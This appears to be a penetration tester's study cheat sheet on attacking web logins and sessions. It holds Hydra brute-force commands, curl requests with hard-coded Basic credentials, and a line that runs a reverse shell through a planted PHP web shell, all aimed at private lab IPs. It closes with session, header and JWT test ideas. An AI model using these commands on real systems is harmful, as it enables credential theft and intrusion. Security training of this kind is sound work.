# Authentication and Sessions

Primary workflow page for login handling, credential attacks, session controls, and authz edge cases.
Keep both the transport mechanics and the decision logic visible: how the login actually works matters as much as the endpoint itself.

## Web Application Login Checklist

1. Try empty username and password fields.
2. Use the username as the password.
3. Search for default credentials.
4. Bruteforce with small username and password lists.
5. Fuzz for special characters using:

```bash
/usr/share/seclists/Fuzzing/special-chars.txt
```

6. Attempt to bypass the login page.
7. Bruteforce with a userlist and a password list generated from `cewl`.
8. Check for account lockout policies.
9. Analyze error messages for hints.
10. Step back and review your enumeration—**try harder.**
11. Ensure all possible avenues have been explored.

## HTTP POST Login

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

> The first field is the login form location, the second is the request body (username and password - `^PASS^` is Hydra's placeholder), and the third is the failed login identifier.

## HTTP AUTH (Basic)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.217.201 http-get

curl -X POST -i -H "Authorization: Basic b2Zmc2VjOmVsaXRl" http://192.168.150.46:242

curl <https://example.com/protected-resource> \\
-H "Authorization: Basic $(echo -n "username:password" | base64)"
-H "X-API-Token: your_api_token"

# Using FTP or another service, place a simpple php shell AND reverse shell and call it
$ curl -H 'Authorization: Basic b2Zmc2VjOmVsaXRl' -G --data-urlencode 'cmd=.\rev.exe' http://192.168.160.46:242/cmd.php
```


## Session and State Handling Checks

- Test direct object access with cookies or bearer tokens removed, downgraded, duplicated, or replayed.
- Change `Host`, `Origin`, `Referer`, `X-Forwarded-For`, `X-Original-URL`, and method overrides only when the application or proxy behavior suggests they matter.
- Compare login responses for valid user / bad password, invalid user, locked user, MFA-required, and password-reset-required cases.
- Reuse intercepted session cookies after logout, password change, or privilege change to check for invalidation gaps.
- If the app uses JWTs, inspect `alg`, `kid`, audience, issuer, expiry, and trust decisions before spending time on brute-force guesses.
